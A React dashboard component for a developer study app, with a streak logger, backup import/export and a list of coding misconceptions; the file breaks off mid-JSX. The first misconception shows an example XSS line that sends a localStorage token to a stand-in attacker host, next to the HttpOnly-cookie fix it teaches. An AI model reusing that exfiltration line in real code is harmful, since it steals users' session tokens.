import React, { useState, useEffect } from 'react';
import { 
  Sparkles, Layers, BookOpen, FileText, HelpCircle, ArrowRight, CheckCircle2, AlertCircle,
  GraduationCap, Coffee, Code, Database, ChevronRight, PlayCircle, Download, Upload, ShieldAlert,
  Trash2, Plus, X, ThumbsUp, Check, XCircle, Flame, Zap, RotateCcw, Info, Mic,
  Calendar, Minus, History, PenTool
} from 'lucide-react';
import { DatabaseState, Topic, Subtopic, NoteItem, PdfItem, ConceptItem, VaultItem } from '../types';

interface DashboardProps {
  dbState: DatabaseState;
  onSelectView: (view: 'dashboard' | string) => void;
  onOpenSubtopic: (topicId: string, subtopicId: string) => void;
  onUpdateDb: (updates: Partial<DatabaseState>) => void;
  onTriggerNewTopic: () => void;
}

interface MisconceptionItem {
  id: number;
  category: string;
  theme: 'javascript' | 'mern' | 'deployment' | 'database';
  title: string;
  myth: string;
  explanation: string;
  wrongCodeTitle: string;
  wrongCode: string;
  rightCodeTitle: string;
  rightCode: string;
  takeaway: string;
}

const DEVELOPER_MISCONCEPTIONS: MisconceptionItem[] = [
  {
    id: 1,
    category: "🛡️ XSS Security Hole",
    theme: "mern",
    title: "The LocalStorage JWT Storage Anti-Pattern",
    myth: "Saving authentication JWTs directly in localStorage is perfectly safe because only my site domain can read it.",
    explanation: "Any third-party script, malicious npm library, or unvetted Google Tag Manager container running on your page has access to window's raw localStorage. If an XSS vulnerability exists, attackers can scrape everyone's tokens instantly! Instead, restrict script capabilities by returning HttpOnly, Secure cookie lines from your Node server.",
    wrongCodeTitle: "❌ VULNERABLE APPROACH (localStorage)",
    wrongCode: `// Client-Side Login Success Handler
localStorage.setItem('auth_token', response.data.token);
// Potential XSS script:
const stl = localStorage.getItem('auth_token');
fetch('https://attacker.io/steal?key=' + stl); // Token stolen!`,
    rightCodeTitle: "✅ CRYPTOGRAPHICALLY SECURE WAY (HttpOnly Cookies)",
    rightCode: `// Server-Side Express Login Response
res.cookie('auth_token', token, {
  httpOnly: true, // ⚠️ Completely invisible to client-side JS scripts!
  secure: true,   // Sent ONLY over HTTPS connections
  sameSite: 'strict'
});`,
    takeaway: "Never trust raw browser memory with authorization secrets. Process tokens server-side using secure HttpOnly cookies."
  },
  {
    id: 2,
    category: "🧠 React Optimization Loop",
    theme: "javascript",
    title: "Evaluating Objects/Functions in Dependency Lists",
    myth: "React knows when structural configurations change, so I should just pass helper functions or configuration options objects straight into useEffect.",
    explanation: "React relies on strict reference equality (Object.is) for dependencies checks. Object literals or custom arrow functions get redeclared and allocated a separate memory hash on every single render. Putting them inside a dependency list tricks React into firing your side-effect continuously, causing extreme lag and API overloads.",
    wrongCodeTitle: "❌ WATERFALL RERENDER FLICKER",
    wrongCode: `function MainSearchPanel() {
  const options = { limit: 10, offset: 0 }; // Recreated on EVERY render

  useEffect(() => {
    fetchApiData(options);
  }, [options]); // ❌ Infinite Render Loop Triggered!
}`,
    rightCodeTitle: "✅ CONSOLIDATED PRIMITIVES ARRAY",
    rightCode: `function MainSearchPanel() {
  const [limit] = useState(10);
  const [offset] = useState(0);

  useEffect(() => {
    fetchApiData({ limit, offset });
  }, [limit, offset]); // ✅ Fires ONLY if numeric values change
}`,
    takeaway: "Either keep dependencies as static primitive scalars (strings, numbers) or wrap complex targets with useMemo / useCallback."
  },
  {
    id: 3,
    category: "💥 React Immutability Rule",
    theme: "javascript",
    title: "Direct Mutation of Reference State Variables",
    myth: "As long as I trigger my state setter afterwards, React doesn't mind if I update arrays or object properties directly.",
    explanation: "React uses strict reference checks to see if state actually changed. If you mutate values in-place, the memory address of the object remains identical (identity preservation). React assumes nothing changed and skips updating the virtual DOM entirely!",
    wrongCodeTitle: "❌ GHOST STATE MUTATION (No render occurs)",
    wrongCode: `const [list, setList] = useState(['Concept A', 'Concept B']);

const handleAdd = (item) => {
  list.push(item); // Direct array modification
  setList(list);   // React sees identical reference array; skips rendering!
};`,
    rightCodeTitle: "✅ NOVEL RESOLVED SHAPE ALLOCATION",
    rightCode: `const [list, setList] = useState(['Concept A', 'Concept B']);

const handleAdd = (item) => {
  setList(prev => [...prev, item]); // ✅ Spread pattern forces novel instance hash!
};`,
    takeaway: "Treat state objects as completely immutable, cold-storage blocks. Always allocate fresh instances (via spread / map / filter)."
  },
  {
    id: 4,
    category: "⚡ Async Pipeline Acceleration",
    theme: "javascript",
    title: "Sequential Blocking Waterfall Queries",
    myth: "Using async/await guarantees parallel processing since node-concurrency allows non-blocking calls.",
    explanation: "If you stack three await lines consecutively, Node blocks execution of each line until the previous one yields its response. Your network requests run sequentially, resulting in an additive lag of all network durations. Run requests concurrently with Promise.all for a major speedup.",
    wrongCodeTitle: "❌ BLOCKING WATERFALL PIPELINE (Slow!)",
    wrongCode: `// Each await acts as a sequential gate
const user = await fetchUser();       // Takes 300ms
const posts = await fetchPosts();     // Takes 400ms (Total = 700ms)
const ads = await fetchCampaigns();   // Takes 250ms (Total = 950ms)
renderDashboard(user, posts, ads);`,
    rightCodeTitle: "✅ CONCURRENT OVERLAPPED EXECUTION (Fast!)",
    rightCode: `// Trigger all requests concurrently first
const [user, posts, ads] = await Promise.all([
  fetchUser(),
  fetchPosts(),
  fetchCampaigns()
]); // Runs collectively in maximum-duration overlap: ~400ms total! ✅`,
    takeaway: "Never serialize independent queries. Fire them in parallel with Promise.all to minimize latency."
  },
  {
    id: 5,
    category: "☁️ Serverless & Database Health",
    theme: "database",
    title: "Uncontrolled Database Connection Re-Instantiations",
    myth: "I should boot my MongoDB/Postgres database adapter in my serverless endpoint's route listener so it only opens when someone requests it.",
    explanation: "On serverless environments (or standard high-frequency active endpoints), booting connection clients INSIDE route handlers allocates a brand new connection socket array on every trigger invocation. Your database's socket pool will immediately choke and throw 'too many connections' errors. Reuse connections globally.",
    wrongCodeTitle: "❌ POOL CONGESTION ENGINE (Server crashes under load)",
    wrongCode: `// Express Route Handler
app.get('/api/users', async (req, res) => {
  const client = new MongoClient(process.env.MONGO_URI);
  await client.connect(); // Opens connection pool from scratch ON EVERY CALL!
  const users = await client.db().collection('users').find().toArray();
  res.json(users);
});`,
    rightCodeTitle: "✅ GLOBAL CACHED ADAPTER HOISTING",
    rightCode: `// Initialize AND cache the client OUTSIDE the handler block!
let cachedClient = null;

async function connectToDb() {
  if (!cachedClient) {
    cachedClient = await MongoClient.connect(process.env.MONGO_URI);
  }
  return cachedClient;
} // Shared/reused across concurrent requests ✅`,
    takeaway: "Always initialize database client instances outside of the request-response callback scope to cache connection pools."
  }
];

export function Dashboard({ dbState, onSelectView, onOpenSubtopic, onUpdateDb, onTriggerNewTopic }: DashboardProps) {
  const { topics, subtopics, pdfs, notes, videos, concepts, coding, interviews, quizzes } = dbState;
  
  // Feedback states for importing data
  const [successMsg, setSuccessMsg] = useState<string | null>(null);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);

  // Tech Unlearning & Anti-Pattern Buster Hub State
  const [currentMythIdx, setCurrentMythIdx] = useState(0);
  const [revealMythSol, setRevealMythSol] = useState(false);
  const [mindBlownCount, setMindBlownCount] = useState<Record<number, boolean>>({});
  const [mythsLearnedTotal, setMythsLearnedTotal] = useState(0);

  // Dynamic 14-day study log tracking states
  const todayDateStr = (() => {
    const d = new Date();
    const year = d.getFullYear();
    const month = String(d.getMonth() + 1).padStart(2, '0');
    const day = String(d.getDate()).padStart(2, '0');
    return `${year}-${month}-${day}`;
  })();

  const [selectedLogDate, setSelectedLogDate] = useState<string>(todayDateStr);
  const [logText, setLogText] = useState('');
  const [questionsCount, setQuestionsCount] = useState<number>(0);
  const [selectedTopicTags, setSelectedTopicTags] = useState<string[]>([]);
  const [logSavedFeedback, setLogSavedFeedback] = useState<boolean>(false);

  // Sync log edits with the active date change
  useEffect(() => {
    const existingLog = dbState.streakLogs?.[selectedLogDate];
    if (existingLog) {
      setLogText(existingLog.text);
      setQuestionsCount(existingLog.questionsSolved || 0);
      setSelectedTopicTags(existingLog.topicsLearned || []);
    } else {
      setLogText('');
      setQuestionsCount(0);
      setSelectedTopicTags([]);
    }
    setLogSavedFeedback(false);
  }, [selectedLogDate, dbState.streakLogs]);

  const handleSaveStreakLog = (dateStr: string) => {
    const updatedLogs = { ...(dbState.streakLogs || {}) };
    
    if (!logText.trim() && questionsCount === 0 && selectedTopicTags.length === 0) {
      delete updatedLogs[dateStr];
    } else {
      updatedLogs[dateStr] = {
        text: logText.trim(),
        questionsSolved: questionsCount,
        topicsLearned: selectedTopicTags,
        createdAt: updatedLogs[dateStr]?.createdAt || new Date().toISOString()
      };
    }

    onUpdateDb({ streakLogs: updatedLogs });
    setLogSavedFeedback(true);
    setTimeout(() => setLogSavedFeedback(false), 2000);
  };

  const handleDeleteStreakLog = (dateStr: string) => {
    if (confirm("Are you sure you want to delete this study log entry?")) {
      const updatedLogs = { ...(dbState.streakLogs || {}) };
      delete updatedLogs[dateStr];
      onUpdateDb({ streakLogs: updatedLogs });
    }
  };

  // Calculate totals
  const totalTopicsCount = topics.length;
  const totalSubtopicsCount = subtopics.length;
  const totalResourcesCount = pdfs.length + videos.length + concepts.length + coding.length + interviews.length;
  const totalQuizzesCount = quizzes.length;
  const totalPdfsCount = pdfs.length;

  // Smart Recommender: Find a target subtopic to recommend "You haven't touched this in a while"
  let recommendation: { topic: Topic; subtopic: Subtopic } | null = null;
  if (subtopics.length > 0 && topics.length > 0) {
    // Pick the oldest or first subtopic for recommendation
    const recommendedSubtopic = subtopics[subtopics.length - 1];
    const parentTopic = topics.find(t => t.id === recommendedSubtopic.topicId);
    if (parentTopic) {
      recommendation = { topic: parentTopic, subtopic: recommendedSubtopic };
    }
  }

  // Get recent topics list (max 3)
  const recentTopics = [...topics].slice(-3);

  // Core concepts management state
  const [addingConceptForSubIdx, setAddingConceptForSubIdx] = useState<string | null>(null);
  const [inlineConceptText, setInlineConceptText] = useState('');

  const handleAddCoreConcept = (subtopicId: string) => {
    if (!inlineConceptText.trim()) return;
    const updatedSubtopics = subtopics.map(s => {
      if (s.id === subtopicId) {
        const currentList = s.coreConcepts || [];
        return { ...s, coreConcepts: [...currentList, inlineConceptText.trim()] };
      }
      return s;
    });
    onUpdateDb({ subtopics: updatedSubtopics });
    setInlineConceptText('');
    setAddingConceptForSubIdx(null);
  };

  const handleRemoveCoreConcept = (subtopicId: string, indexToRemove: number) => {
    const updatedSubtopics = subtopics.map(s => {
      if (s.id === subtopicId) {
        const currentList = s.coreConcepts || [];
        const filtered = currentList.filter((_, idx) => idx !== indexToRemove);
        return { ...s, coreConcepts: filtered };
      }
      return s;
    });
    onUpdateDb({ subtopics: updatedSubtopics });
  };

  // Robust backup exporter using Blob for large datasets
  const handleExportBackup = () => {
    try {
      setSuccessMsg(null);
      setErrorMsg(null);
      const dataStr = JSON.stringify(dbState, null, 2);
      const blob = new Blob([dataStr], { type: 'application/json' });
      const url = URL.createObjectURL(blob);
      
      const defaultName = `codexshelf-vault-backup-${new Date().toISOString().slice(0, 10)}.json`;
      
      const link = document.createElement('a');
      link.href = url;
      link.download = defaultName;
      link.click();
      
      setTimeout(() => {
        URL.revokeObjectURL(url);
      }, 150);
      
      setSuccessMsg("All links, study cards, notes, quizzes & topics successfully compiled and exported as JSON file!");
    } catch (e) {
      console.error("Export operation failed:", e);
      setErrorMsg("Failed to stream and construct database compile. Ensure standard browser permissions are granted.");
    }
  };

  // Robust backup parser/loader
  const handleImportBackup = (e: React.ChangeEvent<HTMLInputElement>) => {
    try {
      setSuccessMsg(null);
      setErrorMsg(null);
      
      const files = e.target.files;
      if (!files || files.length === 0) return;
      
      const file = files[0];
      const reader = new FileReader();
      
      reader.onload = (evt) => {
        try {
          const rawText = evt.target?.result as string;
          const parsed = JSON.parse(rawText);
          
          if (parsed && typeof parsed === 'object') {
            // Validate and clean up optional segments
            const restored: DatabaseState = {
              topics: Array.isArray(parsed.topics) ? parsed.topics : [],
              subtopics: Array.isArray(parsed.subtopics) ? parsed.subtopics : [],
              pdfs: Array.isArray(parsed.pdfs) ? parsed.pdfs : [],
              notes: Array.isArray(parsed.notes) ? parsed.notes : [],
              videos: Array.isArray(parsed.videos) ? parsed.videos : [],
              concepts: Array.isArray(parsed.concepts) ? parsed.concepts : [],
              coding: Array.isArray(parsed.coding) ? parsed.coding : [],
              interviews: Array.isArray(parsed.interviews) ? parsed.interviews : [],
              quizzes: Array.isArray(parsed.quizzes) ? parsed.quizzes : [],
              trackers: Array.isArray(parsed.trackers) ? parsed.trackers : [],
              vaultItems: Array.isArray(parsed.vaultItems) ? parsed.vaultItems : [],
              vaultCategories: Array.isArray(parsed.vaultCategories) ? parsed.vaultCategories : [],
              assignments: Array.isArray(parsed.assignments) ? parsed.assignments : [],
              todos: Array.isArray(parsed.todos) ? parsed.todos : [],
            };
            
            // Validate at least some keys are set
            if (restored.topics.length === 0 && restored.subtopics.length === 0) {
              setErrorMsg("No active topics or subtopics found in the selected JSON database state.");
              return;
            }
            
            onUpdateDb(restored);
            const totalResources = restored.notes.length + restored.pdfs.length + restored.videos.length + restored.quizzes.length + restored.concepts.length + restored.coding.length + restored.interviews.length;
            setSuccessMsg(`Vault imported successfully! Loaded ${restored.topics.length} topics, ${restored.subtopics.length} subtopics, ${restored.vaultItems?.length || 0} Knowledge Vault links, ${restored.trackers?.length || 0} trackings, and ${totalResources} study resource items.`);
          } else {
            setErrorMsg("Invalid data structure. The uploaded backup must be a valid CodeXshelf export JSON object.");
          }
        } catch (err) {
          console.error(err);
          setErrorMsg("JSON Parse failed. Make sure the uploaded backup is a valid, raw JSON schema text file.");
        }
      };
      
      reader.readAsText(file);
    } catch (err) {
      console.error(err);
      setErrorMsg("Failed to open file reader on this device.");
    }
  };

  return (
    <div className="space-y-8 animate-in fade-in slide-in-from-bottom-2 duration-200">
      
      {/* 1. Header Section */}
      <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 border-b border-slate-200 dark:border-slate-800 pb-5">
        <div className="text-left">
          <p className="text-[10px] font-black text-amber-500 uppercase tracking-widest font-mono">
            Active Study Portal
          </p>
          <h2 className="text-3xl font-extrabold text-slate-900 dark:text-white mt-1 tracking-tight font-sans">
            Neural Learning Matrix
          </h2>
          <p className="text-xs text-slate-500 dark:text-slate-400 mt-1 font-sans">
            One high-retention environment to track, review, and consolidate your engineering competencies.
          </p>
        </div>

        <div className="flex items-center gap-2">
          <button
            onClick={onTriggerNewTopic}
            className="px-4 py-2 border border-slate-200 dark:border-slate-800 bg-white dark:bg-slate-900 hover:bg-slate-50 dark:hover:bg-slate-850 text-slate-650 dark:text-slate-300 text-xs font-bold rounded-xl transition-all cursor-pointer font-mono shadow-3xs"
          >
            + NEW TOPIC
          </button>
        </div>
      </div>

      {/* 2. Top Bento row (Streak Engine + Development Insights) */}
      <div className="grid grid-cols-1 xl:grid-cols-12 gap-6">
        
        {/* Daily Study Streak & Neural Heat Map */}
        <div className="xl:col-span-12 lg:xl:col-span-5 bg-white dark:bg-slate-900/65 border border-slate-200 dark:border-slate-800 p-6 rounded-3xl shadow-3xs text-left relative overflow-hidden flex flex-col justify-between space-y-6">
          <div className="space-y-4">
            <div className="flex items-center justify-between gap-2">
              <span className="text-[10px] font-bold text-amber-500 bg-amber-500/10 border border-amber-500/20 px-2 py-0.5 rounded-md font-mono tracking-wide uppercase flex items-center gap-1">
                <Flame className="w-3.5 h-3.5 fill-amber-500 text-amber-500 animate-pulse" />
                Neural Habit Grid
              </span>

              <span className="text-[9px] font-mono text-slate-400 font-bold">
                WEEKLY CYCLE
              </span>
            </div>

            {/* Streak Hero Title */}
            <div>
              {(() => {
                const streak = dbState.streak || { count: 0, lastActiveDate: "" };
                const streakCount = streak.count || 0;
                
                const todayStrStr = (() => {
                  const d = new Date();
                  const year = d.getFullYear();
                  const month = String(d.getMonth() + 1).padStart(2, '0');
                  const day = String(d.getDate()).padStart(2, '0');
                  return `${year}-${month}-${day}`;
                })();
                const completedTodayStr = streak.lastActiveDate === todayStrStr;

                const progressPercent = streakCount === 0 ? 0 : Math.min(100, Math.round(((streakCount % 7) || 7) / 7 * 100));

                const habitDays = Array.from({ length: 14 }).map((_, i) => {
                  const dOffset = 13 - i; // from 13 days ago to 0 (today)
                  const d = new Date();
                  d.setDate(d.getDate() - dOffset);
                  const dayNum = String(d.getDate());
                  const monthNum = String(d.getMonth() + 1);
                  const formattedDate = `${monthNum}/${dayNum}`;
                  const yearInstance = d.getFullYear();
                  const fullDateStr = `${yearInstance}-${String(monthNum).padStart(2, '0')}-${String(dayNum).padStart(2, '0')}`;
                  
                  // If we have S days of streak, light up the last S days
                  const isActive = streakCount > 0 && dOffset < streakCount;
                  const isToday = dOffset === 0;
                  const hasLog = !!dbState.streakLogs?.[fullDateStr];

                  return {
                    dOffset,
                    formattedDate,
                    fullDateStr,
                    isActive,
                    isToday,
                    hasLog,
                    dayName: d.toLocaleDateString([], { weekday: 'short' }),
                    fullDateFriendly: d.toLocaleDateString([], { weekday: 'long', month: 'short', day: 'numeric' })
                  };
                });

                return (
                  <div className="space-y-5">
                    <div>
                      <div className="flex items-baseline gap-2">
                        <span className="text-3xl font-black text-slate-900 dark:text-white font-mono tracking-tight text-amber-550 dark:text-amber-400">
                          {streakCount} {streakCount === 1 ? 'Day' : 'Days'}
                        </span>
                        <span className="text-xs font-bold text-amber-500 dark:text-amber-400 uppercase tracking-wider font-sans">
                          Habit Streak
                        </span>
                      </div>
                      <p className="text-xs text-slate-500 dark:text-slate-400 mt-1 font-sans leading-relaxed">
                        {completedTodayStr 
                          ? "✨ Study actions completed today! Great job maintaining your memory retention." 
                          : "⏳ Complete a task or study commitment today to keep your fire burning!"
                        }
                      </p>
                    </div>

                    {/* Subtle Progress Bar */}
                    <div className="space-y-1.5">
                      <div className="flex items-center justify-between text-[10px] font-sans font-bold">
                        <span className="text-slate-700 dark:text-slate-300">
                          {streakCount === 0 ? 'Spark Inactive' : `Milestone Tier ${Math.floor(streakCount / 7) + 1}`}
                        </span>
                        <span className="font-mono text-amber-600 dark:text-amber-400 font-bold">
                          {(streakCount % 7) || (streakCount > 0 ? 7 : 0)} / 7 Days
                        </span>
                      </div>
                      
                      <div className="w-full bg-slate-100 dark:bg-slate-800/80 rounded-full h-2 overflow-hidden relative border border-slate-200 dark:border-slate-850/50">
                        <div 
                          className="bg-gradient-to-r from-amber-500 to-orange-500 h-full rounded-full transition-all duration-300"
                          style={{ width: `${progressPercent}%` }}
                        />
                      </div>
                      
                      <p className="text-[10px] italic text-slate-400 font-sans leading-tight">
                        {streakCount === 0 
                          ? "💡 Procrastination Buster tip: Create 1 small 15-minute study target to kickstart study habits." 
                          : `🏆 Consistent Study! Keep it up: ${7 - ((streakCount % 7) || 0)} more active days until the next neural reward tier.`
                        }
                      </p>
                    </div>

                    {/* 14-day Habit Heat Map Grid */}
                    <div className="space-y-2 pt-2 border-t border-slate-100 dark:border-slate-850/60">
                      <p className="text-[10px] font-mono font-extrabold text-slate-400 dark:text-slate-500 uppercase tracking-widest leading-none mb-2">
                        14-Day Micro-Activity Grid (Click day to log text)
                      </p>
                      
                      <div className="grid grid-cols-7 gap-2">
                        {habitDays.map(day => {
                          const isSelected = selectedLogDate === day.fullDateStr;
                          return (
                            <div 
                              key={day.dOffset}
                              onClick={() => setSelectedLogDate(day.fullDateStr)}
                              className={`aspect-square rounded-xl flex flex-col items-center justify-center relative group cursor-pointer border-2 transition-all ${
                                isSelected
                                  ? 'border-amber-500 bg-amber-50 dark:bg-amber-950/20 ring-2 ring-amber-400/20'
                                  : day.isActive
                                    ? 'bg-gradient-to-br from-amber-400 to-orange-500 border-amber-300 dark:border-orange-500/30 text-slate-900 dark:text-slate-950 font-extrabold shadow-3xs'
                                    : day.isToday
                                      ? 'bg-slate-550/10 dark:bg-slate-950 border-dashed border-amber-500/50 text-slate-450 font-bold'
                                      : 'bg-slate-50/70 dark:bg-slate-950/40 border-slate-200 dark:border-slate-850 hover:bg-slate-100 dark:hover:bg-slate-850 text-slate-400'
                              }`}
                            >
                              <span className="text-[9px] font-mono leading-none font-bold">
                                {day.dayName.charAt(0)}
                              </span>
                              <span className="text-[8px] font-mono mt-0.5 opacity-80">
                                {day.formattedDate}
                              </span>

                              {/* Glowing log indicator */}
                              {day.hasLog && (
                                <span className="absolute top-1 right-1 w-1.5 h-1.5 rounded-full bg-emerald-500 shadow-sm animate-pulse" />
                              )}

                              {/* Hover tooltip for positive reinforcement */}
                              <div className="absolute bottom-full left-1/2 -translate-x-1/2 mb-2 hidden group-hover:block z-50 bg-slate-950 dark:bg-slate-100 text-slate-100 dark:text-slate-900 text-[10px] px-2.5 py-1.5 rounded-lg shadow-lg pointer-events-none whitespace-nowrap font-sans font-bold leading-none">
                                {day.fullDateFriendly} {day.isToday ? '(Today)' : ''}
                                {day.hasLog ? ' • 📝 Logged!' : ''}
                                <span className="block text-[8px] opacity-75 font-mono mt-1 text-left">
                                  {day.hasLog ? `"${dbState.streakLogs?.[day.fullDateStr]?.text.slice(0, 30)}..."` : day.isActive ? '🔥 Study Loop Active!' : '⏳ Click to log progress'}
                                </span>
                              </div>
                            </div>
                          );
                        })}
                      </div>

                      <div className="flex items-center justify-between text-[9px] text-slate-400 font-mono font-medium pt-1.5 leading-none">
                        <span>13 days ago</span>
                        <span className="flex items-center gap-1.5 font-sans font-medium text-[8.5px]">
                          <span className="w-1.5 h-1.5 rounded-sm bg-slate-100 dark:bg-slate-950 border border-slate-250 dark:border-slate-800 shadow-3xs" />
                          <span>Rest</span>
                          <span className="w-1.5 h-1.5 rounded-sm bg-gradient-to-br from-amber-400 to-orange-550 shadow-3xs" />
                          <span>Active Learning</span>
                        </span>
                        <span>Today</span>
                      </div>
                    </div>

                    {/* Date-Specific Study Logging Editor */}
                    <div className="pt-3 border-t border-slate-150 dark:border-slate-850/60 space-y-3">
                      <div className="flex items-center justify-between gap-1.5">
                        <div className="flex items-center gap-1.5">
                          <div className="p-1 px-2 rounded-lg bg-amber-50 dark:bg-amber-950/20 text-amber-550 dark:text-amber-400 font-mono text-[9.5px] font-bold flex items-center gap-1 border border-amber-200/50 dark:border-amber-950/40">
                            <Calendar className="w-3.5 h-3.5 text-amber-555" />
                            <span>
                              {(() => {
                                const d = new Date(selectedLogDate + 'T12:00:00');
                                return d.toLocaleDateString([], { month: 'short', day: 'numeric', weekday: 'short' });
                              })()}
                              {selectedLogDate === todayDateStr ? " (Today)" : ""}
                            </span>
                          </div>
                        </div>

                        {dbState.streakLogs?.[selectedLogDate] && (
                          <button
                            type="button"
                            onClick={() => handleDeleteStreakLog(selectedLogDate)}
                            className="text-[9.5px] font-bold text-rose-500 hover:text-rose-600 font-mono uppercase cursor-pointer py-1 px-1.5 hover:bg-rose-50 dark:hover:bg-rose-950/15 rounded-md transition-all shrink-0"
                          >
                            Delete log
                          </button>
                        )}
                      </div>

                      <div className="space-y-3 bg-slate-50/50 dark:bg-slate-950/20 border border-slate-150 dark:border-slate-850/40 p-3 rounded-2xl">
                        {/* Text Area block */}
                        <div className="space-y-1">
                          <label className="text-[9px] font-extrabold text-slate-405 dark:text-slate-500 uppercase tracking-widest block font-mono">
                            Activity Notes & Achievements
                          </label>
                          <textarea
                            value={logText}
                            onChange={(e) => setLogText(e.target.value)}
                            placeholder="What concepts did you learn, or which questions did you solve on this date?"
                            className="w-full min-h-[58px] text-xs bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-850 rounded-xl p-2 px-3 text-slate-800 dark:text-slate-100 placeholder-slate-400 focus:outline-none focus:border-amber-400 dark:focus:border-amber-500 resize-none font-sans leading-relaxed text-left"
                          />
                        </div>

                        {/* Extra parameters: Questions Solved & Topic Pill Selectors */}
                        <div className="grid grid-cols-1 md:grid-cols-2 gap-3 pt-1">
                          {/* Questions counter */}
                          <div className="space-y-1">
                            <label className="text-[9px] font-extrabold text-slate-405 dark:text-slate-500 uppercase tracking-widest block font-mono">
                              Questions Solved
                            </label>
                            <div className="flex items-center gap-1.5">
                              <button
                                type="button"
                                onClick={() => setQuestionsCount(prev => Math.max(0, prev - 1))}
                                className="w-7 h-7 rounded-lg border border-slate-200 dark:border-slate-800 flex items-center justify-center hover:bg-slate-100 dark:hover:bg-slate-850 text-slate-500 dark:text-slate-400 cursor-pointer active:scale-95 transition-all outline-none"
                              >
                                <Minus className="w-3.5 h-3.5" />
                              </button>
                              
                              <input
                                type="number"
                                min="0"
                                value={questionsCount === 0 ? '' : questionsCount}
                                onChange={(e) => {
                                  const val = parseInt(e.target.value);
                                  setQuestionsCount(isNaN(val) ? 0 : Math.max(0, val));
                                }}
                                placeholder="0"
                                className="w-12 h-7 rounded-lg border border-slate-200 dark:border-slate-800 text-center font-mono text-xs bg-white dark:bg-slate-900 focus:outline-none focus:border-amber-400 focus:ring-0 dark:text-white"
                              />

                              <button
                                type="button"
                                onClick={() => setQuestionsCount(prev => prev + 1)}
                                className="w-7 h-7 rounded-lg border border-slate-200 dark:border-slate-800 flex items-center justify-center hover:bg-slate-100 dark:hover:bg-slate-850 text-slate-500 dark:text-slate-400 cursor-pointer active:scale-95 transition-all outline-none"
                              >
                                <Plus className="w-3.5 h-3.5" />
                              </button>
                              <span className="text-[10px] text-slate-400 dark:text-slate-500 font-mono font-medium">solved</span>
                            </div>
                          </div>

                          {/* Quick Categories Studied */}
                          <div className="space-y-1">
                            <label className="text-[9px] font-extrabold text-slate-405 dark:text-slate-500 uppercase tracking-widest block font-mono">
                              Topics Studied
                            </label>
                            <div className="flex flex-wrap gap-1 max-h-[46px] overflow-y-auto pr-1">
                              {topics.map(t => {
                                const isSelected = selectedTopicTags.includes(t.name);
                                return (
                                  <button
                                    key={t.id}
                                    type="button"
                                    onClick={() => {
                                      if (isSelected) {
                                        setSelectedTopicTags(prev => prev.filter(name => name !== t.name));
                                      } else {
                                        setSelectedTopicTags(prev => [...prev, t.name]);
                                      }
                                    }}
                                    className={`px-2 py-0.5 rounded-md text-[9px] font-extrabold tracking-tight uppercase font-mono border transition-all cursor-pointer ${
                                      isSelected
                                        ? 'bg-amber-500/10 text-amber-500 border-amber-500/30 dark:bg-amber-500/20'
                                        : 'bg-white dark:bg-slate-900 text-slate-450 dark:text-slate-500 border-slate-200 dark:border-slate-800 hover:border-slate-300 dark:hover:border-slate-700'
                                    }`}
                                  >
                                    {t.name}
                                  </button>
                                );
                              })}
                              {topics.length === 0 && (
                                <span className="text-[10px] italic text-slate-400 dark:text-slate-500">No active topics found.</span>
                              )}
                            </div>
                          </div>
                        </div>

                        {/* Save Trigger Button */}
                        <div className="flex items-center justify-between gap-2 border-t border-slate-150 dark:border-slate-850/50 pt-2.5 mt-1.5">
                          <span className="text-[9.5px] text-slate-400 dark:text-slate-500 italic font-medium leading-none">
                            {logSavedFeedback ? (
                              <span className="text-emerald-500 dark:text-emerald-450 font-bold flex items-center gap-1 font-mono">
                                <Check className="w-3.5 h-3.5" /> Log dynamic entry preserved!
                              </span>
                            ) : "Grid select updates notes instantly"}
                          </span>
                          
                          <button
                            type="button"
                            onClick={() => handleSaveStreakLog(selectedLogDate)}
                            className="px-4 py-1.5 rounded-xl bg-gradient-to-r from-amber-500 to-orange-550 hover:from-amber-600 hover:to-orange-650 text-white font-bold text-[10.5px] uppercase tracking-wider font-mono shadow-sm active:scale-97 transition-all cursor-pointer select-none"
                          >
                            Save Log Entry
                          </button>
                        </div>
                      </div>
                    </div>

                    {/* Log History Scrollable Journal list */}
                    {Object.keys(dbState.streakLogs || {}).length > 0 && (
                      <div className="pt-3 border-t border-slate-150 dark:border-slate-850/60 space-y-2">
                        <div className="flex items-center gap-1.5 justify-between">
                          <p className="text-[10px] font-mono font-extrabold text-slate-405 dark:text-slate-500 uppercase tracking-widest leading-none">
                            📜 Learning History logs
                          </p>
                          <span className="text-[9px] font-mono bg-slate-100 dark:bg-slate-950 border border-slate-200 dark:border-slate-800 px-1.5 py-0.5 rounded text-slate-400 font-bold">
                            {Object.keys(dbState.streakLogs || {}).length} entries
                          </span>
                        </div>

                        <div className="max-h-[148px] overflow-y-auto space-y-2 pr-1 scrollbar-thin scrollbar-trigger">
                          {Object.entries(dbState.streakLogs || {})
                            .sort((a, b) => b[0].localeCompare(a[0])) // chronological decay
                            .map(([dateStr, entry]) => {
                              const d = new Date(dateStr + 'T12:00:00');
                              const formattedD = d.toLocaleDateString([], { month: 'short', day: 'numeric', weekday: 'short' });
                              const isSelected = selectedLogDate === dateStr;

                              return (
                                <div 
                                  key={dateStr}
                                  onClick={() => setSelectedLogDate(dateStr)}
                                  className={`rounded-xl border p-2.5 text-left transition-all hover:bg-slate-50/50 dark:hover:bg-slate-850/20 cursor-pointer ${
                                    isSelected 
                                      ? 'bg-amber-500/[0.04] dark:bg-amber-500/[0.02] border-amber-400 dark:border-amber-400/30' 
                                      : 'bg-white dark:bg-slate-900/40 border-slate-200 dark:border-slate-850'
                                  }`}
                                >
                                  <div className="flex items-start justify-between gap-1.5">
                                    <div className="w-full">
                                      <span className="text-[9.5px] font-bold text-slate-705 dark:text-slate-300 font-sans block leading-none">
                                        {formattedD}
                                        {dateStr === todayDateStr ? " (Today)" : ""}
                                      </span>
                                      
                                      <p className="text-[11px] text-slate-500 dark:text-slate-400 font-sans mt-1.5 leading-relaxed">
                                        {entry.text || <span className="italic text-slate-400">Activity registered (no notes logged)</span>}
                                      </p>

                                      <div className="flex items-center flex-wrap gap-1.5 mt-2">
                                        {entry.questionsSolved !== undefined && entry.questionsSolved > 0 && (
                                          <span className="px-1.5 py-0.5 rounded bg-emerald-500/10 text-emerald-600 dark:text-emerald-405 border border-emerald-500/15 text-[8.5px] font-mono leading-none font-bold">
                                            ✅ {entry.questionsSolved} {entry.questionsSolved === 1 ? 'question' : 'questions'} solved
                                          </span>
                                        )}

                                        {(entry.topicsLearned || []).map(topic => (
